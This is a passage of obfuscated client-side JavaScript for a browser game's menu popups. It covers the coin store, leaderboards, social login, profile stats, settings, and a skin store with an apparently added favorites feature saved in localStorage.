    _0x248a9a.prototype.Xo = function (_0x312b8f) {
      var _0x1fa7c7 = this;
      var _0x41fcc8 = _0x331039.va(0, 2147483647) & 2147483647;
      this.Jo.push(_0x41fcc8);
      _0x4ead11.f.g(_0x7f096e.Ho.Lo, 100);
      _0x331039.Y(function () {
        _0x1fa7c7.Yo(_0x41fcc8);
      }, _0x312b8f);
      return new _0x1ecb47(this, _0x41fcc8);
    };
    _0x248a9a.prototype.Yo = function (_0x2cab09) {
      var _0x1c8348 = this.Jo.indexOf(_0x2cab09);
      if (!(_0x1c8348 < 0)) {
        this.Jo.splice(_0x1c8348, 1);
        if (this.Jo.length === 0) {
          _0x4ead11.f.h(_0x7f096e.Ho.Lo, 100);
        }
      }
    };
    _0x7f096e.Ho = _0x248a9a;
    var _0x592e56;
    var _0x2f6cdd;
    var _0x1b052;
    var _0x499ff4;
    var _0x44dc82;
    var _0x2a8027;
    var _0x46e41a;
    var _0x226af9;
    var _0x243d00;
    var _0x19b2c7;
    var _0x27fb3f;
    var _0x2e5d67;
    var _0x3c4a57;
    var _0xba08;
    var _0x1250ad;
    var _0x3fb489;
    var _0x2b23a9;
    var _0x3eadc8;
    var _0x3683b2;
    var _0x47e4a7;
    var _0x5ce594;
    var _0xdf3a6d;
    var _0x5f433f;
    var _0x1bbfd8;
    var _0x239ef0;
    var _0x5ae1c3;
    var _0xf42f2c;
    var _0x17bb0b;
    var _0x5129ef;
    var _0x1b6ac5;
    var _0x37dc9e;
    var _0x2406ac;
    var _0x5e5a76;
    var _0xe04f01;
    var _0x188ce8;
    var _0x2ad8a7;
    var _0x562bc9;
    var _0x37aca5;
    var _0x2101e3;
    var _0x2143f0;
    var _0x58be33;
    var _0x370119;
    var _0x11dbbb;
    var _0x130328;
    var _0xc02acb;
    var _0x599f60;
    var _0x3a93d9;
    var _0xbf6ba9;
    var _0x3cc727;
    var _0x1a3173;
    var _0x5747f9;
    var _0x5c899d;
    var _0x425fb5;
    var _0x1993b5;
    var _0x17d6ca;
    var _0x34f625;
    var _0x5c0006;
    var _0x3302a7;
    var _0x248a9a;
    var _0x1020fb;
    var _0x3f1e92;
    var _0x34a2c2;
    var _0x1378d9;
    var _0x457727;
    var _0x39706d;
    var _0xd3101;
    var _0x2d968c;
    var _0x373f38;
    var _0x6c5246;
    var _0x4eb266;
    var _0x1a7a73;
    var _0x4ab8bf;
    var _0x26b194;
    var _0x7b83aa;
    var _0x323cf6;
    var _0x564acd;
    var _0x108fee;
    var _0xe38cff;
    var _0xae3d5;
    var _0x5675cd;
    var _0x146fd1;
    var _0x126f2f;
    var _0x1c1805;
    var _0x5aef06;
    var _0x2decde;
    var _0x4387b7;
    var _0x1e4b2c;
    var _0x2adab8;
    var _0x1b7476;
    var _0x5bb89e;
    var _0x11cd13;
    var _0x2c61f8;
    var _0x59cc0f;
    var _0x3b69ac;
    var _0x2031ce;
    var _0x10d419;
    var _0x2fa01a;
    var _0x2f91d7;
    var _0x4ee9ff;
    var _0x2f1c80;
    var _0x3ac8ae;
    var _0x57b92c;
    var _0x27258c;
    var _0x1ca9c2;
    var _0x2926c5;
    var _0x43f1d5;
    var _0x5ab950;
    var _0x2a1290;
    var _0x4ed486;
    var _0x4a5632;
    var _0x56810a;
    var _0x20e109;
    var _0x1a8d23;
    var _0x3b90c2;
    var _0x29975b;
    var _0x37b2b6;
    var _0x4d3601;
    var _0x359b75;
    var _0x59526d;
    var _0x3ef8b6;
    var _0x3af96c;
    var _0x12b9fd;
    var _0x4e8351;
    var _0x47207f;
    var _0x328ede;
    var _0x4e7822;
    var _0x4cb0d1;
    var _0x43e97e;
    var _0x58e333;
    var _0x3bd2c9;
    var _0x17aa2f;
    var _0xf069d1;
    var _0x2b8ce5;
    var _0x44378b;
    var _0x569188;
    var _0x8601ac;
    var _0x21615f;
    var _0x275237;
    var _0x46f318;
    var _0x2bf15d;
    var _0x386cb4;
    var _0x2061ac;
    var _0x510a47;
    var _0x37fb80;
    var _0x5d16c7;
    var _0x157ca6;
    var _0x153201;
    var _0x2c30d7;
    var _0x412915;
    var _0x3fcb5d;
    var _0x182de3;
    var _0x1ecb47 = function () {
      function _0x42272b(_0x3b91f7, _0x4eda79) {
        this.Zo = _0x3b91f7;
        this.$o = _0x4eda79;
      }
      _0x42272b.prototype._o = function () {
        this.Zo.Yo(this.$o);
      };
      return _0x42272b;
    }();
    _0x1020fb = $("#store-buy-coins_125000");
    _0x3f1e92 = $("#store-buy-coins_50000");
    _0x34a2c2 = $("#store-buy-coins_16000");
    _0x1378d9 = $("#store-buy-coins_7000");
    _0x457727 = $("#store-buy-coins_3250");
    _0x39706d = $("#store-buy-coins_1250");
    (_0xd3101 = _0x331039.ca(_0x7f096e.Ho, function () {
      _0x7f096e.Ho.call(this, _0x331039.U("index.game.popup.menu.coins.tab"), false);
      var _0x10b20d = this;
      _0x1020fb.click(function () {
        ooo.ij.if();
        _0x10b20d.ap("coins_125000");
      });
      _0x3f1e92.click(function () {
        ooo.ij.if();
        _0x10b20d.ap("coins_50000");
      });
      _0x34a2c2.click(function () {
        ooo.ij.if();
        _0x10b20d.ap("coins_16000");
      });
      _0x1378d9.click(function () {
        ooo.ij.if();
        _0x10b20d.ap("coins_7000");
      });
      _0x457727.click(function () {
        ooo.ij.if();
        _0x10b20d.ap("coins_3250");
      });
      _0x39706d.click(function () {
        ooo.ij.if();
        _0x10b20d.ap("coins_1250");
      });
    })).prototype.Sa = function () {
      _0xd3101.parent.prototype.Sa.call(this);
    };
    _0xd3101.prototype.Wo = function () {
      _0x4ead11.f.g(_0x7f096e.Ho.Mo, 200);
      _0x4ead11.f.h(_0x7f096e.Ho.No, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Oo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Po, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Qo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Ro, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.So, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.To, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Uo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Vo, 50);
    };
    _0xd3101.prototype.nl = function () {
      ooo.ij.jf();
    };
    _0xd3101.prototype.ap = function (_0x5a890b) {};
    _0x7f096e.Ik = _0xd3101;
    _0x2d968c = $("#highscore-table");
    _0x373f38 = $("#leaders-button-level");
    _0x6c5246 = $("#leaders-button-highscore");
    _0x4eb266 = $("#leaders-button-kills");
    _0x1a7a73 = "byLevel";
    _0x4ab8bf = "byHighScore";
    _0x26b194 = "byKillsAndHeadShots";
    (_0x7b83aa = _0x331039.ca(_0x7f096e.Ho, function () {
      _0x7f096e.Ho.call(this, _0x331039.U("index.game.popup.menu.leaders.tab"), true);
      var _0x416550 = this;
      this.bp = {};
      this.cp = {
        dp: {
          ep: _0x373f38,
          fp: _0x1a7a73
        },
        gp: {
          ep: _0x6c5246,
          fp: _0x4ab8bf
        },
        hp: {
          ep: _0x4eb266,
          fp: _0x26b194
        }
      };
      _0x373f38.click(function () {
        ooo.ij.if();
        _0x416550.ip(_0x416550.cp.dp);
      });
      _0x6c5246.click(function () {
        ooo.ij.if();
        _0x416550.ip(_0x416550.cp.gp);
      });
      _0x4eb266.click(function () {
        ooo.ij.if();
        _0x416550.ip(_0x416550.cp.hp);
      });
    })).prototype.Sa = function () {
      _0x7b83aa.parent.prototype.Sa.call(this);
    };
    _0x7b83aa.prototype.Wo = function () {
      _0x4ead11.f.h(_0x7f096e.Ho.Mo, 50);
      _0x4ead11.f.g(_0x7f096e.Ho.No, 200);
      _0x4ead11.f.h(_0x7f096e.Ho.Oo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Po, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Qo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Ro, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.So, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.To, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Uo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Vo, 50);
    };
    _0x7b83aa.prototype.nl = function () {
      var _0x16b69e = this;
      ooo.ij.jf();
      var _0x53c2bc = this.Xo(5000);
      var _0x1f729f = _0x494ea6.H.J + "/pub/leaders";
      _0x331039.Aa(_0x1f729f, function () {
        var _0x5cad83 = {
          [_0x1a7a73]: [],
          [_0x4ab8bf]: [],
          [_0x26b194]: []
        };
        _0x16b69e.bp = _0x5cad83;
        _0x16b69e.ip(_0x16b69e.jp ?? _0x16b69e.cp.dp);
        _0x53c2bc._o();
      }, function (_0x4092de) {
        _0x16b69e.bp = _0x4092de;
        _0x16b69e.ip(_0x16b69e.jp ?? _0x16b69e.cp.dp);
        _0x53c2bc._o();
      });
    };
    _0x7b83aa.prototype.ip = function (_0x194bdf) {
      this.jp = _0x194bdf;
      for (var _0xaaf7cf in this.cp) {
        if (this.cp.hasOwnProperty(_0xaaf7cf)) {
          this.cp[_0xaaf7cf].ep.removeClass("pressed");
        }
      }
      ;
      this.jp.ep.addClass("pressed");
      for (var _0x10272d = this.bp[this.jp.fp], _0x44c31f = "", _0x8a4102 = 0; _0x8a4102 < _0x10272d.length; _0x8a4102++) {
        var _0x732b5e = _0x10272d[_0x8a4102];
        _0x44c31f += `<div class="table-row"><span>${_0x8a4102 + 1}</span><span><img src="${_0x732b5e.avatarUrl}"/></span><span>${_0x732b5e.username}</span><span>${_0x732b5e.level}</span><span>${_0x732b5e.highScore}</span><span>${_0x732b5e.headShots} / ${_0x732b5e.kills}</span></div>`;
      }
      ;
      _0x2d968c.empty();
      _0x2d968c.append(_0x44c31f);
    };
    _0x7f096e.Kk = _0x7b83aa;
    _0x323cf6 = $("#popup-login-gg");
    _0x564acd = $("#popup-login-fb");
    (_0x108fee = _0x331039.ca(_0x7f096e.Ho, function () {
      var _0xfd38bc = this;
      _0x7f096e.Ho.call(this, _0x331039.U("index.game.popup.menu.login.tab"), false);
      _0x323cf6.click(function () {
        ooo.ij.if();
        var _0x410e95 = _0xfd38bc.Xo(10000);
        _0x331039.Y(function () {
          ooo.ok.sm(function () {
            if (ooo.ok.nk()) {
              ooo.ij.mf();
            }
            _0x410e95._o();
          });
        }, 500);
      });
      _0x564acd.click(function () {
        ooo.ij.if();
        var _0x1082c8 = _0xfd38bc.Xo(10000);
        _0x331039.Y(function () {
          ooo.ok.pm(function () {
            if (ooo.ok.nk()) {
              ooo.ij.mf();
            }
            _0x1082c8._o();
          });
        }, 500);
      });
    })).prototype.Sa = function () {
      _0x108fee.parent.prototype.Sa.call(this);
    };
    _0x108fee.prototype.Wo = function () {
      _0x4ead11.f.h(_0x7f096e.Ho.Mo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.No, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Oo, 50);
      _0x4ead11.f.g(_0x7f096e.Ho.Po, 200);
      _0x4ead11.f.h(_0x7f096e.Ho.Qo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Ro, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.So, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.To, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Uo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Vo, 50);
    };
    _0x108fee.prototype.nl = function () {
      ooo.ij.jf();
    };
    _0x7f096e.Ok = _0x108fee;
    _0xe38cff = $("#profile-avatar");
    _0xae3d5 = $("#profile-username");
    _0x5675cd = $("#profile-experience-bar");
    _0x146fd1 = $("#profile-experience-val");
    _0x126f2f = $("#profile-level");
    _0x1c1805 = $("#profile-stat-highScore");
    _0x5aef06 = $("#profile-stat-bestSurvivalTime");
    _0x2decde = $("#profile-stat-kills");
    _0x4387b7 = $("#profile-stat-headshots");
    _0x1e4b2c = $("#profile-stat-gamesPlayed");
    _0x2adab8 = $("#profile-stat-totalTimeSpent");
    _0x1b7476 = $("#profile-stat-registrationDate");
    (_0x5bb89e = _0x331039.ca(_0x7f096e.Ho, function () {
      _0x7f096e.Ho.call(this, _0x331039.U("index.game.popup.menu.profile.tab"), true);
    })).prototype.Sa = function () {
      _0x5bb89e.parent.prototype.Sa.call(this);
    };
    _0x5bb89e.prototype.Wo = function () {
      _0x4ead11.f.h(_0x7f096e.Ho.Mo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.No, 50);
      _0x4ead11.f.g(_0x7f096e.Ho.Oo, 200);
      _0x4ead11.f.h(_0x7f096e.Ho.Po, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Qo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Ro, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.So, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.To, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Uo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Vo, 50);
    };
    _0x5bb89e.prototype.nl = function () {
      ooo.ij.jf();
      var _0x264ac9 = ooo.ok.dm();
      var _0xb497c0 = moment([_0x264ac9.year, _0x264ac9.month - 1, _0x264ac9.day]).format("LL");
      _0xae3d5.html(ooo.ok.Ll());
      _0xe38cff.attr("src", ooo.ok.Nl());
      _0x5675cd.width(ooo.ok.Sl() * 100 / ooo.ok.Tl() + "%");
      _0x146fd1.html(ooo.ok.Sl() + " / " + ooo.ok.Tl());
      _0x126f2f.html(ooo.ok.Rl());
      _0x1c1805.html(ooo.ok.Zl());
      _0x5aef06.html(_0x331039.$(ooo.ok.$l()));
      _0x2decde.html(ooo.ok._l());
      _0x4387b7.html(ooo.ok.am());
      _0x1e4b2c.html(ooo.ok.bm());
      _0x2adab8.html(_0x331039.$(ooo.ok.cm()));
      _0x1b7476.html(_0xb497c0);
    };
    _0x7f096e.Mk = _0x5bb89e;
    _0x11cd13 = $("#settings-music-enabled-switch");
    _0x2c61f8 = $("#settings-sfx-enabled-switch");
    _0x59cc0f = $("#settings-show-names-switch");
    _0x3b69ac = $("#popup-logout");
    _0x2031ce = $("#popup-logout-container");
    _0x10d419 = $("#popup-delete-account");
    _0x2fa01a = $("#popup-delete-account-container");
    _0x2f91d7 = $("#popup-withdraw-consent");
    (_0x4ee9ff = _0x331039.ca(_0x7f096e.Ho, function () {
      _0x7f096e.Ho.call(this, _0x331039.U("index.game.popup.menu.settings.tab"), false);
      var _0x220f10 = this;
      _0x11cd13.click(function () {
        var _0x268288 = !!_0x11cd13.prop("checked");
        _0x7f096e.Cg.Ng(_0x7f096e.Cg.Fg, _0x268288, 30);
        ooo.ij.$e(_0x268288);
        ooo.ij.if();
      });
      _0x2c61f8.click(function () {
        var _0x41d48c = !!_0x2c61f8.prop("checked");
        _0x7f096e.Cg.Ng(_0x7f096e.Cg.Gg, _0x41d48c, 30);
        ooo.ij.Xe(_0x41d48c);
        ooo.ij.if();
      });
      _0x59cc0f.click(function () {
        ooo.ij.if();
      });
      _0x3b69ac.click(function () {
        ooo.ij.if();
        _0x220f10.Xo(500);
        ooo.ok.qm();
      });
      _0x10d419.click(function () {
        if (ooo.ok.nk()) {
          ooo.ij.if();
          ooo.Xg.gl(ooo.Xg.Fk);
        } else {
          ooo.ij.nf();
        }
      });
      _0x2f91d7.click(function () {
        if (ooo.kp()) {
          ooo.ij.if();
          ooo.Xg.gl(ooo.Xg.Dk);
        } else {
          ooo.ij.nf();
        }
      });
    })).prototype.Sa = function () {
      var _0xb0877;
      var _0x322240;
      var _0x273f11;
      _0x4ee9ff.parent.prototype.Sa.call(this);
      _0xb0877 = _0x7f096e.Cg.Og(_0x7f096e.Cg.Fg) !== "false";
      _0x11cd13.prop("checked", _0xb0877);
      ooo.ij.$e(_0xb0877);
      _0x322240 = _0x7f096e.Cg.Og(_0x7f096e.Cg.Gg) !== "false";
      _0x2c61f8.prop("checked", _0x322240);
      ooo.ij.Xe(_0x322240);
      _0x273f11 = _0x7f096e.Cg.Og(_0x7f096e.Cg.Eg) !== "false";
      _0x59cc0f.prop("checked", _0x273f11);
      ooo.ok.em(function () {
        _0x2031ce.toggle(ooo.ok.nk());
        _0x2fa01a.toggle(ooo.ok.nk());
      });
    };
    _0x4ee9ff.prototype.Wo = function () {
      _0x4ead11.f.h(_0x7f096e.Ho.Mo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.No, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Oo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Po, 50);
      _0x4ead11.f.g(_0x7f096e.Ho.Qo, 200);
      _0x4ead11.f.h(_0x7f096e.Ho.Ro, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.So, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.To, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Uo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Vo, 50);
    };
    _0x4ee9ff.prototype.nl = function () {
      ooo.ij.jf();
      if (ooo.kp()) {
        _0x2f91d7.show();
      } else {
        _0x2f91d7.hide();
      }
    };
    _0x4ee9ff.prototype.Gi = function () {
      return _0x59cc0f.prop("checked");
    };
    _0x7f096e.Pk = _0x4ee9ff;
    _0x2f1c80 = $("#store-view-canv");
    _0x3ac8ae = $("#skin-description-text");
    _0x57b92c = $("#skin-group-description-text");
    _0x27258c = $("#store-locked-bar");
    _0x1ca9c2 = $("#store-locked-bar-text");
    _0x2926c5 = $("#store-buy-button");
    _0x43f1d5 = $("#store-item-price");
    _0x5ab950 = $("#store-groups");
    _0x2a1290 = $("#store-view-prev");
    _0x4ed486 = $("#store-view-next");
    (_0x4a5632 = _0x331039.ca(_0x7f096e.Ho, function () {
      _0x7f096e.Ho.call(this, _0x331039.U("index.game.popup.menu.skins.tab"), true);
      var _0x2d0e30 = this;
      this.lp = null;
      this.mp = [];
      this.np = {};
      this.op = new _0x7f096e.Lm(_0x2f1c80);
      _0x2926c5.click(function () {
        ooo.ij.if();
        _0x2d0e30.pp();
      });
      _0x2a1290.click(function () {
        ooo.ij.if();
        _0x2d0e30.lp.qp();
      });
      _0x4ed486.click(function () {
        ooo.ij.if();
        _0x2d0e30.lp.rp();
      });
    })).prototype.Sa = function () {
      _0x4a5632.parent.prototype.Sa.call(this);
      var _0x4f0ba6 = this;
      ooo.ud.Jc(function () {
        var _0x3fa81c = ooo.ud.Gc();
        _0x4f0ba6.mp = [];
        for (var _0x11665c = 0; _0x11665c < _0x3fa81c.skinGroupArrayDict.length; _0x11665c++) {
          _0x4f0ba6.mp.push(new _0x56810a(_0x4f0ba6, _0x3fa81c.skinGroupArrayDict[_0x11665c]));
        }
        ;
        _0x4f0ba6.np = {};
        for (var _0x194400 = 0; _0x194400 < _0x3fa81c.skinArrayDict.length; _0x194400++) {
          var _0x1a466a = _0x3fa81c.skinArrayDict[_0x194400];
          _0x4f0ba6.np[_0x1a466a.id] = _0x1a466a;
        }
        ;
        _0x4f0ba6.sp();
      });
      this.tp(false);
      ooo.so.fk(function () {
        _0x4f0ba6.tp(false);
      });
    };
    _0x4a5632.prototype.Wo = function () {
      _0x4ead11.f.h(_0x7f096e.Ho.Mo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.No, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Oo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Po, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Qo, 50);
      _0x4ead11.f.g(_0x7f096e.Ho.Ro, 200);
      _0x4ead11.f.h(_0x7f096e.Ho.So, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.To, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Uo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Vo, 50);
    };
    _0x4a5632.prototype.nl = function () {
      ooo.ij.Ye(_0x7f096e.Pe.Se.Jf);
      ooo.ij.jf();
      this.sp();
      this.op.rg(true);
    };
    _0x4a5632.prototype.hl = function () {
      this.op.rg(false);
    };
    _0x4a5632.prototype.qg = function () {
      this.op.qg();
    };
    _0x4a5632.prototype.ug = function (_0x3d8a96, _0x37bb7d) {
      this.op.ug();
    };
    _0x4a5632.prototype.sp = function () {
      var _0x15ec1e = this;
      var _0x6c55b8 = this;
      _0x5ab950.empty();
      for (var _0x421239 = 0; _0x421239 < this.mp.length; _0x421239++) {
        (function (_0xe71101) {
          var _0x172ebc = _0x15ec1e.mp[_0xe71101];
          var _0x176db5 = _0x7f096e.d.createElement("li");
          _0x5ab950.append(_0x176db5);
          var _0x3e1a4e = $(_0x176db5);
          if (_0x6c55b8.xp && _0x6c55b8.xp.isCustom) {
            _0x3e1a4e.addClass("iscustom");
          }
          _0x3e1a4e.html(_0x172ebc.up());
          _0x3e1a4e.click(function () {
            ooo.ij.if();
            _0x6c55b8.vp(_0x172ebc);
          });
          _0x172ebc.wp = _0x3e1a4e;
        })(_0x421239);
      }
      ;
      if (this.mp.length > 0) {
        var _0x286509 = ooo.so.Zj(_0x7f096e._j.$j);
        for (var _0x29d8a4 = 0; _0x29d8a4 < this.mp.length; _0x29d8a4++) {
          var _0x2e153a = this.mp[_0x29d8a4];
          for (var _0x1389f1 = _0x2e153a.xp.list, _0x1d9bd2 = 0; _0x1d9bd2 < _0x1389f1.length; _0x1d9bd2++) {
            if (_0x1389f1[_0x1d9bd2] === _0x286509) {
              _0x2e153a.yp = _0x1d9bd2;
              this.vp(_0x2e153a);
              return;
            }
          }
        }
        ;
        this.vp(this.mp[0]);
      }
    };
    _0x4a5632.prototype.vp = function (_0x2bde66) {
      if (this.lp !== _0x2bde66) {
        this.lp = _0x2bde66;
        _0x5ab950.children().removeClass("pressed");
        if (this.lp.wp) {
          this.lp.wp.addClass("pressed");
        }
        _0x57b92c.html("");
        if (_0x2bde66.xp != null) {
          var _0x194bb1 = ooo.ud.Gc().textDict[_0x2bde66.xp.description];
          if (_0x194bb1 != null) {
            _0x57b92c.html(_0x331039.aa(_0x331039.V(_0x194bb1)));
          }
        }
        ;
        this.tp(true);
      }
    };
    _0x4a5632.prototype.zp = function () {
      if (this.lp == null) {
        return _0x7f096e.yj.Aj();
      } else {
        return this.lp.Ap();
      }
    };
    _0x4a5632.prototype.pp = function () {
      var _0x4eacb3 = this.zp();
      if (_0x4eacb3.Cj()) {
        var _0x3134d9 = _0x4eacb3.Mc();
        this.Bp(_0x3134d9);
      }
    };
    _0x4a5632.prototype.Bp = function (_0xc1ad76) {
      var _0x2a7826 = ooo.so.mk(_0xc1ad76, _0x7f096e._j.$j);
      if (_0x2a7826 != null) {
        var _0x49d110 = _0x2a7826.pk();
        if (!(ooo.ok.Ql() < _0x49d110)) {
          var _0x3f0ed1 = ooo.so.Zj(_0x7f096e._j.$j);
          var _0x3fb2f4 = ooo.so.Zj(_0x7f096e._j.ak);
          var _0x1b1c34 = ooo.so.Zj(_0x7f096e._j.bk);
          var _0x105ab6 = ooo.so.Zj(_0x7f096e._j.dk);
          var _0x518772 = ooo.so.Zj(_0x7f096e._j.ck);
          var _0x1d4343 = this.Xo(5000);
          ooo.ok.nm(_0xc1ad76, _0x7f096e._j.$j, function () {
            _0x1d4343._o();
            ooo.Xg.gl(ooo.Xg._k);
          }, function () {
            ooo.ok.hm(function () {
              ooo.so.lk(_0x3f0ed1, _0x7f096e._j.$j);
              ooo.so.lk(_0x3fb2f4, _0x7f096e._j.ak);
              ooo.so.lk(_0x1b1c34, _0x7f096e._j.bk);
              ooo.so.lk(_0x105ab6, _0x7f096e._j.dk);
              ooo.so.lk(_0x518772, _0x7f096e._j.ck);
              ooo.so.lk(_0xc1ad76, _0x7f096e._j.$j);
              _0x1d4343._o();
            });
          });
        }
      }
    };
    _0x4a5632.prototype.tp = function (_0xde8f3e) {
      var _0x1a3a49 = ooo.so.ek();
      var _0x5db0d9 = this.zp();
      if (_0x5db0d9.Cj()) {
        var _0x2bf75b = _0x5db0d9.Mc();
        var _0x4a82a8 = ooo.so.mk(_0x2bf75b, _0x7f096e._j.$j);
        var _0x2b3549 = false;
        $("#add-to-favorites-skin").remove();
        $("#manage-favorites-skin").remove();
        $("#skin-info-text").remove();
        $(".fav-buttons-container").remove();
        $(".favorites-popup").remove();
        if (ooo.so.ik(_0x2bf75b, _0x7f096e._j.$j)) {
          _0x27258c.hide();
          _0x2926c5.hide();
          var _0x3fdae0 = $("<div class='fav-buttons-container' style='margin:10px;display:flex;gap:5px;position:fixed;left:140px;top:105px;z-index:1000;'></div>");
          var _0x402636 = $("<button id='add-to-favorites-skin' class='favorite-button' style='background:#4CAF50;color:white;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;white-space:nowrap;box-shadow:0 2px 4px rgba(0,0,0,0.2);'><span style='font-size:14px;'>★</span> Add</button>");
          var _0x58f3e5 = $("<button id='manage-favorites-skin' class='favorite-button' style='background:#2196F3;color:white;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;white-space:nowrap;box-shadow:0 2px 4px rgba(0,0,0,0.2);'><span style='font-size:14px;'>☰</span> Favorite</button>");
          _0x3fdae0.append(_0x402636);
          _0x3fdae0.append(_0x58f3e5);
          _0x5ab950.append(_0x3fdae0);
          var _0x123aa7 = $("<div>").attr("id", "skin-info-text").css({
            position: "fixed",
            left: "150px",
            top: "155px",
            "font-size": "12px",
            color: "#fff",
            "z-index": "1000"
          }).text("Press '( 1 )' to toggle skins during gameplay").appendTo(_0x5ab950);
          var _0x417888 = $("<div class='favorites-popup' style='display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1e1e2f;border:1px solid #333345;border-radius:8px;padding:0;width:450px;max-height:400px;overflow:hidden;z-index:1000;box-shadow:0 4px 8px rgba(0,0,0,0.5);color:white;'><div style='padding:15px 20px;background-color:#252538;border-bottom:1px solid #333345;position:relative;display:flex;justify-content:space-between;align-items:center;'><button class='close-favorites' style='position:absolute;top:8px;left:10px;font-size:22px;background:none;border:none;color:#aaa;cursor:pointer;padding:0 5px;line-height:1;font-weight:bold;'>&times;</button><h3 style='margin:0 0 0 5px;font-size:18px;color:white;padding-left:15px;'>Favorite</h3><button class='clear-all-favorites' style='padding:4px 8px;background-color:#f44336;color:white;border:none;border-radius:4px;cursor:pointer;font-size:12px;'>Clear All</button></div><div class='favorites-content' style='padding:15px 20px;overflow-y:auto;max-height:330px;'><div class='favorites-grid' style='display:grid;grid-template-columns:1fr 1fr;gap:15px;padding:0;margin:0;'></div></div></div>");
          $("body").append(_0x417888);
          $(".close-favorites").click(function () {
            $(".favorites-popup").hide();
          });
          $(document).mouseup(function (_0x4947e4) {
            var _0x17fe55 = $(".favorites-popup");
            if (!_0x17fe55.is(_0x4947e4.target) && _0x17fe55.has(_0x4947e4.target).length === 0) {
              _0x17fe55.hide();
            }
          });
          $.each($("[id^='skin-info-text']"), function () {
            if ($(this).attr("id") !== "skin-info-text") {
              $(this).remove();
            }
          });
          $(".favorites-content").on("scroll", function () {
            $(this).css("pointer-events", "auto");
          });
          $(".favorites-popup").on("shown", function () {
            setTimeout(function () {
              $(".favorites-content").scrollTop(0);
            }, 100);
          });
          $(".clear-all-favorites").click(function () {
            if (confirm("Are you sure you want to remove all favorite skins?")) {
              _0x207b06.favoriteSkins = [];
              localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
              _0x503260();
              if (_0x402636 && _0x402636.is(":visible")) {
                _0x402636.text("★ Add").css("background-color", "#4CAF50");
              }
            }
          });
          _0x402636.click(function () {
            var _0x15c0ae = _0x2bf75b;
            if (!_0x207b06.favoriteSkins) {
              _0x207b06.favoriteSkins = [];
            }
            var _0x297582 = false;
            try {
              for (var _0x5a7b94 = 0; _0x5a7b94 < _0x207b06.favoriteSkins.length; _0x5a7b94++) {
                if (_0x207b06.favoriteSkins[_0x5a7b94] === _0x15c0ae) {
                  _0x297582 = true;
                  break;
                }
              }
            } catch (_0x2e6756) {
              _0x207b06.favoriteSkins = [];
            }
            if (!_0x297582) {
              _0x207b06.favoriteSkins.push(_0x15c0ae);
              localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
              $(this).text("X").css("background-color", "#f44336");
            } else {
              var _0x1a8b2e = _0x207b06.favoriteSkins.indexOf(_0x15c0ae);
              _0x207b06.favoriteSkins.splice(_0x1a8b2e, 1);
              localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
              $(this).text("★ Add").css("background-color", "#4CAF50");
            }
          });
          _0x58f3e5.click(function () {
            $.each($("[id^='skin-info-text']"), function (_0x2e2762) {
              if (_0x2e2762 > 0) {
                $(this).remove();
              }
            });
            _0x503260();
            $(".favorites-popup").show();
          });
        } else if (_0x4a82a8 == null || _0x4a82a8.qk()) {
          _0x2b3549 = true;
          _0x27258c.show();
          _0x2926c5.hide();
          _0x1ca9c2.text(_0x331039.U("index.game.popup.menu.store.locked"));
          if (_0x4a82a8 != null && _0x4a82a8.qk()) {
            var _0x448bef = ooo.ud.Gc().textDict[_0x4a82a8.ln()];
            if (_0x448bef != null) {
              _0x1ca9c2.text(_0x331039.V(_0x448bef));
            }
          }
        } else {
          _0x27258c.hide();
          _0x2926c5.show();
          _0x43f1d5.html(_0x4a82a8.pk());
        }
        _0x3ac8ae.html("");
        if (_0x4a82a8 != null && _0x4a82a8.mn() != null) {
          var _0x2cd2ac = ooo.ud.Gc().textDict[_0x4a82a8.mn()];
          if (_0x2cd2ac != null) {
            _0x3ac8ae.html(_0x331039.aa(_0x331039.V(_0x2cd2ac)));
          }
        }
        if (StoreSkinID && _0x2bf75b) {
          StoreSkinID.html(_0x2bf75b);
        }
        this.op.Gm(_0x1a3a49.Cn(_0x2bf75b));
        this.op.an(_0x2b3549);
        if (_0xde8f3e) {
          ooo.so.lk(_0x2bf75b, _0x7f096e._j.$j);
        }
      }
    };
